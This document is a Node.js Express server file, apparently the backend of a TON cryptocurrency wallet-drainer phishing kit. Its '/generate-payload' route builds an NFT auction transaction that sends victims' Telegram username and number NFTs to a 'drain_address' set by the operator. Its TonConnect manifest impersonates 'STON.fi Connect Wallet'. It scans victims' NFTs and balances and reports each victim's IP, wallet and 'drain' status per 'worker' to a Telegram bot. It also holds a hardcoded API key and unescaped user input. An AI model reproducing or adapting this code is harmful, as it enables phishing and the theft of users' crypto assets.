require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const { TonClient } = require('ton');
const path = require('path');
const fs = require('fs');
const { Cell, beginCell, Address } = require('@ton/core');
const { sendNotification } = require('../bot/notificationSender');
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./botdata.db');
function sendTelegramNotification(message) {
    sendNotification(message);
}

function setupWebServer(app) {
    app.use(express.json());

    app.use((req, res, next) => {
        next();
    });
    
    app.post('/generate-payload', async (req, res) => {
        try {
            const { price } = req.body; // Assume the price is still coming from the request body
    
            // Fetch the address from the drain_address table
            const getAddressQuery = `SELECT address FROM drain_address WHERE id = 1 LIMIT 1`;
            db.get(getAddressQuery, [], (err, row) => {
                if (err) {
                    console.error('Error fetching address from database:', err);
                    return res.status(500).json({ message: 'Failed to retrieve address from database' });
                }
    
                if (!row || !row.address) {
                    console.error("No address found in the database")
                    return res.status(404).json({ message: 'No address found in the database' });
                }
                const beneficiarAddress = Address.parse(row.address);
                const queryId = Date.now(); 

                const auctionConfig = beginCell()
                    .storeAddress(beneficiarAddress)               // beneficiar_address: MsgAddress
                    .storeCoins(price)                              // dynamic initial_min_bid based on input
                    .storeCoins(price)                              // dynamic max_bid based on input
                    .storeUint(5, 8)                                // min_bid_step (8-bit value)
                    .storeUint(3600, 32)                            // min_extend_time (32-bit value)
                    .storeUint(604800, 32)                          // duration (32-bit value)
                    .endCell();
    
                const payload = beginCell()
                    .storeUint(0x487a8e81, 32)                      // operation code (32-bit value)
                    .storeUint(queryId, 64)                               // query_id (64-bit value)
                    .storeRef(auctionConfig)                        // auction_config
                    .endCell();
    
                const base64Payload = payload.toBoc().toString("base64");
    
                res.json({ payload: base64Payload });
            });
        } catch (error) {
            console.error('Error generating proxy payload:', error);
            res.status(500).json({ message: 'Failed to generate proxy payload' });
        }
    });
    
    app.use(express.static(path.join(__dirname, 'app')));
    
    app.get('/offer', (req, res) => {
        const username = req.query.username; // Get username from query parameters
            
        console.log(`${req.protocol}://${req.get('host')}${req.originalUrl}`);
        const filePath = path.join(__dirname, 'app/index.html');
    
        // Read the file content
        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('Error reading index.html:', err);
                return res.status(500).send('An error occurred');
            }
    
            // Replace the placeholder with the actual username
            const updatedContent = data.replace(/{{username}}/g, username);
    
            // Send the modified HTML content back to the client
            res.send(updatedContent);
        });
    });


    function convertToFriendlyAddress(rawAddress) {
        console.log(`Attempting to convert address: ${rawAddress}`);
        try {
            if (!Address.isValid(rawAddress)) {
                throw new Error(`Invalid address format: ${rawAddress}`);
            }

            const parsedAddress = Address.parse(rawAddress);
            return parsedAddress.toString({ urlSafe: true, bounceable: true });
        } catch (error) {
            console.error('Ошибка при преобразовании адреса:', error);
            return 'Unknown'; // Возвращаем "Unknown", если преобразование не удалось
        }
    }

    const getPriceForNftName = (nftName, type) => {
        return new Promise((resolve, reject) => {
            // Убираем пробелы из имени
            const cleanedName = nftName.replace(/\s+/g, '');
    
            // Ищем цену для конкретного имени
            db.get(`SELECT price FROM prices WHERE type = ? AND identifier = ?`, [type, cleanedName], (err, row) => {
                if (err) {
                    console.error('Error querying the database:', err.message);
                    return reject('Database query failed.');
                }
    
                if (row) {
                    // Если нашли цену для конкретного имени, возвращаем ее
                    return resolve(row.price);
                }
    
                // Если не нашли цену для конкретного имени, ищем общую цену для типа
                db.get(`SELECT price FROM prices WHERE type = ? AND identifier IS NULL`, [type], (err, row) => {
                    if (err) {
                        console.error('Error querying the database:', err.message);
                        return reject('Database query failed.');
                    }
    
                    if (row) {
                        // Если нашли общую цену для типа, возвращаем ее
                        return resolve(row.price);
                    }
    
                    // Если ничего не нашли, возвращаем null или другое значение по умолчанию
                    resolve(null);
                });
            });
        });
    };
    
    
    // Функция для проверки статуса номера или имени пользователя
    async function checkAuctionStatus(input) {
        let url = '';

        // Проверка, если это номер в формате +888
        if (input.startsWith('+888')) {
            // Преобразуем номер в нужный формат для URL
            const formattedNumber = input.replace('+888', '').replace(/\s+/g, '');
            url = `https://fragment.com/number/888${formattedNumber}`;
        }
        // Проверка, если это имя пользователя в формате @username
        else if (input.startsWith('@')) {
            const username = input.replace('@', '');
            url = `https://fragment.com/username/${username}`;
        } else {
            // Если это не номер и не имя пользователя, возвращаем false
            console.log('Invalid input format');
            return true;
        }

        try {
            // Выполняем запрос к странице
            const response = await axios.get(url);
            if (response.status !== 200) {
                console.error(`Error fetching the page: ${response.status} \n\n ${url}`);
                return true;
            }
            // Загружаем HTML-контент страницы с помощью cheerio
            const data_cheerio = cheerio.load(response.data);

            // Ищем элемент с классом 'tm-section-header-status tm-status-avail'
            //const statusText = data_cheerio('.tm-section-header-status.tm-status-avail').text().trim();

            const statusElement = data_cheerio('.tm-section-header-status').text().trim();
            if (statusElement.includes('Sold')) {
                return false;
            } else {
                return true;
            }
        } catch (error) {
            console.error('Error fetching the page:', error);
            return true;
        }
    }

    const getNftData = async (walletAddress) => {
        try {
            const response = await axios.get(`https://tonapi.io/v2/accounts/${walletAddress}/nfts`);
            const nftItems = response.data.nft_items;
            const result = [];
    
            for (const nft of nftItems) {
                const collectionName = nft.collection?.name;
                const nftAddress = convertToFriendlyAddress(nft.address);
                const nftName = nft.metadata?.name; // Получаем имя NFT
                const nftTrust = nft.trust;
    
                let type;
                if (nftTrust !== "whitelist")   {
                    continue; // Пропускаем другие коллекции
                }
                if (await checkAuctionStatus(nftName) === true ){
                    continue; // Пропускаем другие коллекции
                }
                if (collectionName === 'Anonymous Telegram Numbers') {
                    type = 'number';
                } else if (nftName.startsWith('+888')){
                    type = 'number';
                } else if (collectionName === 'Telegram Usernames') {
                    type = 'username';
                } else if (nftName.startsWith('@')) {
                    type = 'username';
                } else {
                    continue; // Пропускаем другие коллекции
                }
    
                // Получаем цену для данного имени NFT
                const price = await getPriceForNftName(nftName.replace(" ",""), type);
    
                result.push({ type, address: nftAddress, name: nftName, price });
            }
            
            // Сортировка по параметру type
            result.sort((a, b) => {
                if (a.type < b.type) return -1;
                if (a.type > b.type) return 1;
                return 0;
            });
    
            console.log(result);
            return result;
        } catch (error) {
            console.error('Error fetching NFTs:', error);
        }
    };
        
    app.post('/get-user-nfts', express.json(), async (req, res) => {
        const { walletAddress } = req.body;
        console.log(walletAddress)
        if (!walletAddress) {
            return res.status(400).json({ error: 'Wallet address is required' });
        }
    
        try {
            const nfts = await getNftData(walletAddress);
            res.status(200).json(nfts);
        } catch (error) {
            console.error('Error in /get-user-nfts:', error.message);
            res.status(500).json({ error: 'Failed to fetch NFTs' });
        }
    });

    async function getWalletBalance(walletAddress) {
        try {
            const formattedAddress = convertToFriendlyAddress(walletAddress);
    
            const response = await axios.get(`https://tonapi.io/v2/accounts/${formattedAddress}`);
    
            if (response.status !== 200 || !response.data || !response.data.balance) {
                throw new Error('Unexpected response format');
            }
    
            const balanceInNanoTON = response.data.balance; // Баланс в нанотонах (1 TON = 10^9 нанотонов)
            console.log(`Balance for ${walletAddress}: ${balanceInNanoTON} nanoTON`);
    
            return balanceInNanoTON;
        } catch (error) {
            console.error('Ошибка при получении баланса:', error.message || error);
            throw new Error('Не удалось получить баланс кошелька.');
        }
    }
    


    app.get('/convert-address', (req, res) => {
        const rawAddress = req.query.address;

        if (!rawAddress) {
            return res.status(400).json({ error: 'Address parameter is missing' });
        }

        const friendlyAddress = convertToFriendlyAddress(rawAddress);

        res.json({ friendlyAddress });
    });

    app.get('/get-wallet-balance', async (req, res) => {
        const { walletAddress } = req.query;
    
        if (!walletAddress) {
            return res.status(400).json({ error: 'Не указан адрес кошелька' });
        }
    
        try {
            const balance = await getWalletBalance(walletAddress);
            res.status(200).json({ balance });
        } catch (error) {
            console.error('Ошибка при обработке запроса на получение баланса:', error.message || error);
            res.status(500).json({ error: 'Ошибка при получении баланса кошелька' });
        }
    });
    

    app.get('/tonconnect-manifest.json', (req, res) => {
        res.send({
            "url": "https://aslan22822.github.io/ton-connect-wallet/",
            "name": "STON.fi Connect Wallet",
            "iconUrl": "https://aslan22822.github.io/ton-connect-wallet/logo.png",
            "termsOfServiceUrl": "https://aslan22822.github.io/ton-connect-wallet/terms",
            "privacyPolicyUrl": "https://aslan22822.github.io/ton-connect-wallet/privacy"
        });
    });

    function convertToFriendlyAddress(rawAddress) {
        try {
            const parsedAddress = Address.parse(rawAddress);
            return parsedAddress.toString({ urlSafe: true, bounceable: false });
        } catch (error) {
            console.error('Ошибка при преобразовании адреса:', error);
            return rawAddress; // Если преобразование не удалось, вернем оригинальный адрес
        }
    }


    async function generateNotificationMessage(walletAddress, timestamp, mode, ip, worker) {
        const friendlyAddress = convertToFriendlyAddress(walletAddress);
        const nfts = await getNftData(friendlyAddress);
    
        let nftDetails = '';
    
        if (nfts && nfts.length > 0) {
            nftDetails = '\n\n🖼 *Найденные NFT:*\n';
            nfts.forEach(nft => {
                nftDetails += `\\ ${escapeMarkdown(nft.name)} : ${nft.price} TON\n`;
            });
        } else {
            nftDetails = '\n\n🖼 *Найденные NFT:* Нет найденных NFT';
            if (mode !== 'drain') {
                return '';
            }
        }
    
        let message = '';
        
        if (mode === 'drain') {
            message = `
    🔌 *Кошелек Подключен*
    
    IP: \`${escapeMarkdown(ip)}\`
    
    📋 *Детали:*
    \\- 🏷️ Адрес кошелька: \`${escapeMarkdown(friendlyAddress)}\`
    \\- 🕒 Время: ${escapeMarkdown(timestamp)}
    \\- 🕒 Work: ${escapeMarkdown(worker)}${nftDetails}
            `;
        } else if (mode === 'approve') {
            message = `
    ✅ *Транзакция Одобрена*
    
    IP: \`${escapeMarkdown(ip)}\`
    
    📋 *Детали:*
    \\- 🏷️ Адрес кошелька: \`${escapeMarkdown(friendlyAddress)}\`
    \\- 🕒 Время: ${escapeMarkdown(timestamp)}
    \\- 🕒 Worker: ${escapeMarkdown(worker)}${nftDetails}
            `;
        } else if (mode === 'decline') {
            message = `
    ❌ *Транзакция Отклонена*
    
    IP: \`${escapeMarkdown(ip)}\`
    
    📋 *Детали:*
    \\- 🏷️ Адрес кошелька: \`${escapeMarkdown(friendlyAddress)}\`
    \\- 🕒 Время: ${escapeMarkdown(timestamp)}
    \\- 🕒 Worker: ${escapeMarkdown(worker)}${nftDetails}
            `;
        }
    
        return message;
    }
    
    function escapeMarkdown(text) {
        return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
    }    
    
    app.post('/notify_performance', async (req, res) => {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        try {
            const { walletAddress, timestamp, mode, worker } = req.body;
    
            // Generate the message using the helper function
            const message = await generateNotificationMessage(walletAddress, timestamp, mode, ip, worker);
            if (message === ''){
                res.status(500).send('NFT not found');
                return;
            }
            // Send the message to Telegram
            await sendTelegramNotification(message);
    
            res.status(200).send('Notification sent');
        } catch (error) {
            console.error('Error in /notify1:', error);
            res.status(500).send('Failed to send notification');
        }
    });
    
    
    app.post('/check-balance', async (req, res) => {
        const { walletAddress } = req.body;

        try {
            const response = await axios.get(`https://toncenter.com/api/v2/getAddressInformation?address=${walletAddress}&apiKey=AF4DENSTPIKDBVQAAAANSPPJQFSOACK7A4H72UXESUKTOJM2P3RE46JG4WIA7AR4STRE2QY`);
            const balance = response.data.result.balance;

            res.json({ balance: parseFloat(balance) / Math.pow(10, 9) });
        } catch (error) {
            console.error('Error fetching balance:', error);
            res.status(500).json({ message: 'Failed to fetch balance' });
        }
    });

    console.log('Web server is set up');
}

module.exports = { setupWebServer };
